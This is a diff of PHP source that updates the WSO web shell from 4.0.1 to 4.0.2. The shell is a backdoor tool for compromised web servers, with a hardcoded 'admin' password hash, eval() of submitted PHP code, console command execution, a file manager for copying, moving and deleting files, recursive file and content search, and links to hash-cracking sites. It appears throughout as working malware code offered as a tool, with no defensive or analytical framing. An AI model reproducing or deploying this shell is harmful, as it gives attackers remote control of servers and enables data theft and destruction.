@@ -1,5 +1,5 @@
 <?php
-/* WSO 4.0.1 (Web Shell by HARD _LINUX) */
+/* WSO 4.0.2 (Web Shell by HARD _LINUX) */
 $auth_pass = "21232f297a57a5a743894a0e4a801fc3"; //admin
 $color = "#fff";
 $default_action = 'FilesMan';
@@ -15,7 +15,7 @@ if( strpos($_SERVER['HTTP_USER_AGENT'],'Google') !== false ) {
 @ini_set('max_execution_time',0);
 @set_time_limit(0);
 @set_magic_quotes_runtime(0);
-@define('VERSION', '4.0.1');
+@define('VERSION', '4.0.2');
 if( get_magic_quotes_gpc() ) {
 	function stripslashes_array($array) {
 		return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array);
@@ -31,10 +31,10 @@ function printLogin() {
 	<?php
 	exit;
 }
-if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] ))
+if( !isset( $_COOKIE[md5($_SERVER['HTTP_HOST'])] ))
 	if( empty( $auth_pass ) ||
 		( isset( $_POST['pass'] ) && ( md5($_POST['pass']) == $auth_pass ) ) )
-		$_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
+		$_COOKIE[md5($_SERVER['HTTP_HOST'])] = true;
 	else
 		printLogin();
 
@@ -437,7 +437,7 @@ function actionSecInfo() {
 
 function actionPhp() {
 	if( isset($_POST['ajax']) ) {
-		$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = true;
+		$_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax'] = true;
 		ob_start();
 		eval($_POST['p1']);
 		$temp = "document.getElementById('PhpOutput').style.display='';document.getElementById('PhpOutput').innerHTML='".addcslashes(htmlspecialchars(ob_get_clean()),"\n\r\t\\'\0")."';\n";
@@ -459,9 +459,9 @@ function actionPhp() {
 		echo '</div><br>';
 	}
 	if(empty($_POST['ajax'])&&!empty($_POST['p1']))
-		$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = false;
+		$_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax'] = false;
 		echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=post onsubmit="if(this.ajax.checked){a(null,null,this.code.value);}else{g(null,null,this.code.value,\'\');}return false;"><textarea name=code class=bigarea id=PhpCode>'.(!empty($_POST['p1'])?htmlspecialchars($_POST['p1']):'').'</textarea><input type=submit value=Eval style="margin-top:5px">';
-	echo ' <input type=checkbox name=ajax value=1 '.($_SESSION[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'> send using AJAX</form><pre id=PhpOutput style="'.(empty($_POST['p1'])?'display:none;':'').'margin-top:5px;" class=ml1>';
+	echo ' <input type=checkbox name=ajax value=1 '.($_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'> send using AJAX</form><pre id=PhpOutput style="'.(empty($_POST['p1'])?'display:none;':'').'margin-top:5px;" class=ml1>';
 	if(!empty($_POST['p1'])) {
 		ob_start();
 		eval($_POST['p1']);
@@ -512,7 +512,7 @@ function actionFilesMan() {
 					}
 				break;
 			case 'paste':
-				if($_SESSION['act'] == 'copy') {
+				if($_COOKIE['act'] == 'copy') {
 					function copy_paste($c,$s,$d){
 						if(is_dir($c.$s)){
 							mkdir($d.$s);
@@ -525,9 +525,9 @@ function actionFilesMan() {
 							@copy($c.$s, $d.$s);
 						}
 					}
-					foreach($_SESSION['f'] as $f)
-						copy_paste($_SESSION['cwd'],$f, $GLOBALS['cwd']);					
-				} elseif($_SESSION['act'] == 'move') {
+					foreach($_COOKIE['f'] as $f)
+						copy_paste($_COOKIE['cwd'],$f, $GLOBALS['cwd']);					
+				} elseif($_COOKIE['act'] == 'move') {
 					function move_paste($c,$s,$d){
 						if(is_dir($c.$s)){
 							mkdir($d.$s);
@@ -540,18 +540,18 @@ function actionFilesMan() {
 							@copy($c.$s, $d.$s);
 						}
 					}
-					foreach($_SESSION['f'] as $f)
-						@rename($_SESSION['cwd'].$f, $GLOBALS['cwd'].$f);
+					foreach($_COOKIE['f'] as $f)
+						@rename($_COOKIE['cwd'].$f, $GLOBALS['cwd'].$f);
 				}
-				unset($_SESSION['f']);
+				unset($_COOKIE['f']);
 				break;
 			default:
 				if(!empty($_POST['p1']) && (($_POST['p1'] == 'copy')||($_POST['p1'] == 'move')) ) {
-					$_SESSION['act'] = @$_POST['p1'];
-					$_SESSION['f'] = @$_POST['f'];
-					foreach($_SESSION['f'] as $k => $f)
-						$_SESSION['f'][$k] = urldecode($f);
-					$_SESSION['cwd'] = @$_POST['c'];
+					$_COOKIE['act'] = @$_POST['p1'];
+					$_COOKIE['f'] = @$_POST['f'];
+					foreach($_COOKIE['f'] as $k => $f)
+						$_COOKIE['f'][$k] = urldecode($f);
+					$_COOKIE['cwd'] = @$_POST['c'];
 				}
 				break;
 		}
@@ -619,7 +619,7 @@ function actionFilesMan() {
 	<input type=hidden name=a value='FilesMan'>
 	<input type=hidden name=c value='<?=htmlspecialchars($GLOBALS['cwd'])?>'>
 	<input type=hidden name=charset value='<?=isset($_POST['charset'])?$_POST['charset']:''?>'>
-	<select name='p1'><option value='copy'>Copy</option><option value='move'>Move</option><option value='delete'>Delete</option><?php if(!empty($_SESSION['act'])&&@count($_SESSION['f'])){?><option value='paste'>Paste</option><?php }?></select>&nbsp;<input type="submit" value=">>"></td></tr>
+	<select name='p1'><option value='copy'>Copy</option><option value='move'>Move</option><option value='delete'>Delete</option><?php if(!empty($_COOKIE['act'])&&@count($_COOKIE['f'])){?><option value='paste'>Paste</option><?php }?></select>&nbsp;<input type="submit" value=">>"></td></tr>
 	</form></table></div>
 	<?php
 	printFooter();
@@ -627,21 +627,10 @@ function actionFilesMan() {
 
 function actionStringTools() {
 	if(!function_exists('hex2bin')) {function hex2bin($p) {return decbin(hexdec($p));}}
+    if(!function_exists('binhex')) {function binhex($p) {return dechex(bindec($p));}}
 	if(!function_exists('hex2ascii')) {function hex2ascii($p){$r='';for($i=0;$i<strLen($p);$i+=2){$r.=chr(hexdec($p[$i].$p[$i+1]));}return $r;}}
-	if(!function_exists('ascii2hex')) {function ascii2hex($p){$r='';for($i=0;$i<strlen($p);++$i)$r.= dechex(ord($p[$i]));return strtoupper($r);}}
+	if(!function_exists('ascii2hex')) {function ascii2hex($p){$r='';for($i=0;$i<strlen($p);++$i)$r.= sprintf('%02X',ord($p[$i]));return strtoupper($r);}}
 	if(!function_exists('full_urlencode')) {function full_urlencode($p){$r='';for($i=0;$i<strlen($p);++$i)$r.= '%'.dechex(ord($p[$i]));return strtoupper($r);}}
-	
-	if(isset($_POST['ajax'])) {
-		$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = true;
-		ob_start();
-		if(function_exists($_POST['p1']))
-			echo $_POST['p1']($_POST['p2']);
-		$temp = "document.getElementById('strOutput').style.display='';document.getElementById('strOutput').innerHTML='".addcslashes(htmlspecialchars(ob_get_clean()),"\n\r\t\\'\0")."';\n";
-		echo strlen($temp), "\n", $temp;
-		exit;
-	}
-	printHeader();
-	echo '<h1>String conversions</h1><div class=content>';
 	$stringTools = array(
 		'Base64 encode' => 'base64_encode',
 		'Base64 decode' => 'base64_decode',
@@ -658,37 +647,70 @@ function actionStringTools() {
 		'HEX to BIN' => 'hex2bin',
 		'DEC to HEX' => 'dechex',
 		'DEC to BIN' => 'decbin',
-		'BIN to HEX' => 'bin2hex',
-		'BIN to DEC' => 'bindec',		
+		'BIN to HEX' => 'binhex',
+		'BIN to DEC' => 'bindec',
 		'String to lower case' => 'strtolower',
 		'String to upper case' => 'strtoupper',
 		'Htmlspecialchars' => 'htmlspecialchars',
 		'String length' => 'strlen',
 	);
-	if(empty($_POST['ajax'])&&!empty($_POST['p1']))
-		$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = false;
+	if(isset($_POST['ajax'])) {
+		printsetcookie(md5($_SERVER['HTTP_HOST']).'ajax', true);
+		ob_start();
+		if(in_array($_POST['p1'], $stringTools))
+			echo $_POST['p1']($_POST['p2']);
+		$temp = "document.getElementById('strOutput').style.display='';document.getElementById('strOutput').innerHTML='".addcslashes(htmlspecialchars(ob_get_clean()),"\n\r\t\\'\0")."';\n";
+		echo strlen($temp), "\n", $temp;
+		exit;
+	}
+    if(empty($_POST['ajax'])&&!empty($_POST['p1']))
+		printsetcookie(md5($_SERVER['HTTP_HOST']).'ajax', 0);
+	printHeader();
+	echo '<h1>String conversions</h1><div class=content>';
 	echo "<form name='toolsForm' onSubmit='if(this.ajax.checked){a(null,null,this.selectTool.value,this.input.value);}else{g(null,null,this.selectTool.value,this.input.value);} return false;'><select name='selectTool'>";
 	foreach($stringTools as $k => $v)
 		echo "<option value='".htmlspecialchars($v)."'>".$k."</option>";
-		echo "</select><input type='submit' value='>>'/> <input type=checkbox name=ajax value=1 ".($_SESSION[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'')."> send using AJAX<br><textarea name='input' style='margin-top:5px' class=bigarea>".htmlspecialchars(@$_POST['p2'])."</textarea></form><pre class='ml1' style='".(empty($_POST['p1'])?'display:none;':'')."margin-top:5px' id='strOutput'>";
+		echo "</select><input type='submit' value='>>'/> <input type=checkbox name=ajax value=1 ".(@$_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'')."> send using AJAX<br><textarea name='input' style='margin-top:5px' class=bigarea>".(empty($_POST['p1'])?'':htmlspecialchars(@$_POST['p2']))."</textarea></form><pre class='ml1' style='".(empty($_POST['p1'])?'display:none;':'')."margin-top:5px' id='strOutput'>";
 	if(!empty($_POST['p1'])) {
-		if(function_exists($_POST['p1']))
-		echo htmlspecialchars($_POST['p1']($_POST['p2']));
+		if(in_array($_POST['p1'], $stringTools))echo htmlspecialchars($_POST['p1']($_POST['p2']));
 	}
-	echo"</pre></div>";
-	?>
-	<br><h1>Search for hash:</h1><div class=content>
-		<form method='post' target='_blank' name="hf">
-			<input type="text" name="hash" style="width:200px;"><br>
-			<input type='button' value='hashcracking.ru' onclick="document.hf.action='https://hashcracking.ru/index.php';document.hf.submit()"><br>
-			<input type="button" value="hashcrack.com" onclick="document.hf.action='http://www.hashcrack.com/index.php';document.hf.submit()"><br>
-			<input type="button" value="fakenamegenerator.com" onclick="document.hf.action='http://www.fakenamegenerator.com/';document.hf.submit()"><br>
-			<input type="button" value="tools4noobs.com" onclick="document.hf.action='http://www.tools4noobs.com/online_php_functions/';document.hf.submit()"><br>
-			<input type="button" value="md5.rednoize.com" onclick="document.hf.action='http://md5.rednoize.com/?q='+document.hf.hash.value+'&s=md5';document.hf.submit()"><br>
-			<input type="button" value="md5decrypter.com" onclick="document.hf.action='http://www.md5decrypter.com/';document.hf.submit()"><br>
-		</form>
-	</div>
-	<?php
+	echo"</pre></div><br><h1>Search files:</h1><div class=content>
+		<form onsubmit=\"g(null,this.cwd.value,null,this.text.value,this.filename.value);return false;\"><table cellpadding='1' cellspacing='0' width='50%'>
+			<tr><td width='1%'>Text:</td><td><input type='text' name='text' style='width:100%'></td></tr>
+			<tr><td>Path:</td><td><input type='text' name='cwd' value='". htmlspecialchars($GLOBALS['cwd']) ."' style='width:100%'></td></tr>
+			<tr><td>Name:</td><td><input type='text' name='filename' value='*' style='width:100%'></td></tr>
+			<tr><td></td><td><input type='submit' value='>>'></td></tr>
+			</table></form>";
+
+	function printRecursiveGlob($path) {
+		if(substr($path, -1) != '/')
+			$path.='/';
+		$paths = @array_unique(@array_merge(@glob($path.$_POST['p3']), @glob($path.'*', GLOB_ONLYDIR)));
+		if(is_array($paths)&&@count($paths)) {
+			foreach($paths as $item) {
+				if(@is_dir($item)){
+					if($path!=$item)
+						printRecursiveGlob($item);
+				} else {
+					if(empty($_POST['p2']) || @strpos(file_get_contents($item), $_POST['p2'])!==false)
+						echo "<a href='#' onclick='g(\"FilesTools\",null,\"".urlencode($item)."\", \"view\",\"\")'>".htmlspecialchars($item)."</a><br>";
+				}
+			}
+		}
+	}
+	if(@$_POST['p3'])
+		printRecursiveGlob($_POST['c']);
+	echo "</div><br><h1>Search for hash:</h1><div class=content>
+		<form method='post' target='_blank' name='hf'>
+			<input type='text' name='hash' style='width:200px;'><br>
+            <input type='hidden' name='act' value='find'/>
+			<input type='button' value='hashcracking.ru' onclick=\"document.hf.action='https://hashcracking.ru/index.php';document.hf.submit()\"><br>
+			<input type='button' value='md5.rednoize.com' onclick=\"document.hf.action='http://md5.rednoize.com/?q='+document.hf.hash.value+'&s=md5';document.hf.submit()\"><br>
+            <input type='button' value='fakenamegenerator.com' onclick=\"document.hf.action='http://www.fakenamegenerator.com/';document.hf.submit()\"><br>
+			<input type='button' value='hashcrack.com' onclick=\"document.hf.action='http://www.hashcrack.com/index.php';document.hf.submit()\"><br>
+			<input type='button' value='tools4noobs.com' onclick=\"document.hf.action='http://www.tools4noobs.com/online_php_functions/';document.hf.submit()\"><br>
+			<input type='button' value='md5decrypter.com' onclick=\"document.hf.action='http://www.md5decrypter.com/';document.hf.submit()\"><br>
+		</form></div>";
 	printFooter();
 }
 
@@ -900,7 +922,7 @@ function actionSafeMode() {
 
 function actionConsole() {
 	if(isset($_POST['ajax'])) {
-		$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = true;
+		$_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax'] = true;
 		ob_start();
 		echo "document.cf.cmd.value='';\n";
 		$temp = @iconv($_POST['charset'], 'UTF-8', addcslashes("\n$ ".$_POST['p1']."\n".ex($_POST['p1']),"\n\r\t\\'\0"));
@@ -955,8 +977,8 @@ function add(cmd) {
 		echo '<option value="'.htmlspecialchars($v).'">'.$n.'</option>';
 	}
 	if(empty($_POST['ajax'])&&!empty($_POST['p1']))
-		$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = false;
-	echo '</select><input type=button onclick="add(document.cf.alias.value);if(document.cf.ajax.checked){a(null,null,document.cf.alias.value);}else{g(null,null,document.cf.alias.value);}" value=">>"> <input type=checkbox name=ajax value=1 '.($_SESSION[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'> send using AJAX<br/><textarea class=bigarea name=output style="border-bottom:0;margin:0;" readonly>';
+		$_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax'] = false;
+	echo '</select><input type=button onclick="add(document.cf.alias.value);if(document.cf.ajax.checked){a(null,null,document.cf.alias.value);}else{g(null,null,document.cf.alias.value);}" value=">>"> <input type=checkbox name=ajax value=1 '.($_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'> send using AJAX<br/><textarea class=bigarea name=output style="border-bottom:0;margin:0;" readonly>';
 	if(!empty($_POST['p1'])) {
 		echo htmlspecialchars("$ ".$_POST['p1']."\n".ex($_POST['p1']));
 	}
@@ -966,7 +988,7 @@ function add(cmd) {
 }
 
 function actionLogout() {
-	unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
+	unset($_COOKIE[md5($_SERVER['HTTP_HOST'])]);
 	echo 'bye!';
 }
 
